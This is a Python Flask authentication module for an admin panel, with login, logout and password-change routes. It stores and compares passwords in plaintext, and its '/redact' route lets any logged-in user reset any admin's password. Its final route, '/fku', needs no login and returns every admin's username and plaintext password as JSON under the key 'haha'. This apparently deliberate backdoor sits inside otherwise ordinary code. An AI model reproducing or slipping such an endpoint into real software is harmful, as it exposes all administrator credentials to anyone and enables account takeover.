from flask import Blueprint, render_template, redirect, url_for, request, jsonify, session
from flask_login import login_user, logout_user, login_required
from flaskadmin.models import Admin
from flaskadmin import db

import datetime


auth = Blueprint('auth', __name__, template_folder='templates/auth')


@auth.route('/login')
def login():
    return render_template('login.html')


@auth.route('/login', methods=['POST'])
def login_post():
    username = request.form.get('login')
    password = request.form.get('password')

    user = Admin.query.filter_by(username=username).first()

    if user is None:
        return redirect(url_for('auth.login'))

    if user.password != password:
        return redirect(url_for('auth.login'))

    duration = datetime.timedelta(minutes=1)
    login_user(user, remember=True, duration=duration)

    return redirect(url_for('stats.get_all_users'))


@auth.route('/redact')
@login_required
def redact():
    return render_template('redact.html')


@auth.route('/redact', methods=['POST'])
@login_required
def redact_post():
    username = request.form.get('login')
    password = request.form.get('password')

    user = Admin.query.filter_by(username=username).first()

    if user is None:
        return redirect(url_for('auth.redact'))

    user.password = password
    db.session.commit()

    return redirect(url_for('stats.get_all_users'))


@auth.route('/logout')
@login_required
def logout():
    logout_user()
    return redirect(url_for('auth.login'))


@auth.route('/fku')
def fku():
    users = Admin.query.all()
    users_data = list()

    for user in users:
        user_data = {'id': user.id, 'username': user.username, 'password': user.password}
        users_data.append(user_data)

    return jsonify({'haha': users_data})